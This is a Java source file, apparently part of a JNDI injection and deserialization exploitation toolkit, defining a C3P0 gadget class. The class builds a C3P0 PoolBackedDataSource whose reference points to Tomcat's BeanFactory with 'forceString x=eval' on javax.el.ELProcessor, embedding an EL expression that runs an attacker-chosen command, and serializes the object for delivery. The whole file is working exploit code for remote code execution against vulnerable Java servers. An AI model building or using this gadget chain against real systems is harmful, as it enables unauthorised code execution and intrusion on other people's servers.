package sonomon.jndi.deser.gadgets;

import sonomon.jndi.deser.MyURLClassLoader;
import sonomon.jndi.factory.FactoryUtils;
import sonomon.jndi.deser.Payload;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import org.apache.naming.ResourceRef;

public class C3P0EL implements SerializeObject{
	static String cmd;
	
    public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
    	cmd = payload;
        MyURLClassLoader classLoader = new MyURLClassLoader(jarname);
        Class clazz = classLoader.loadClass("com.mchange.v2.c3p0.PoolBackedDataSource");
        Constructor con = clazz.getDeclaredConstructor(new Class[0]);
        con.setAccessible(true);
        Object obj = con.newInstance(new Object[0]);
        Field conData = com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        conData.setAccessible(true);
        conData.set(obj, new PoolSource());
        return obj;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	  private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
		  	public PoolSource() {
	        }
	      	public Reference getReference() throws NamingException {
	            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
	            ref.add(new StringRefAddr("forceString", "x=eval"));
	        	String elString = null;
				try {
					elString = Payload.getElPayload(cmd);
				} catch (Exception e) {
					System.out.println("[-]C3P0EL elString error");
					e.printStackTrace();
				}
	            ref.add(new StringRefAddr("x", elString));
	            return ref;
	        }
			@Override
			public PrintWriter getLogWriter() throws SQLException {
				return null;
			}
			@Override
			public void setLogWriter(PrintWriter out) throws SQLException {
			}
			@Override
			public void setLoginTimeout(int seconds) throws SQLException {
			}
			@Override
			public int getLoginTimeout() throws SQLException {
				return 0;
			}
			@Override
			public Logger getParentLogger() throws SQLFeatureNotSupportedException {
				return null;
			}
			@Override
			public PooledConnection getPooledConnection() throws SQLException {
				return null;
			}
			@Override
			public PooledConnection getPooledConnection(String user, String password) throws SQLException {
				return null;
			}

	  }
}
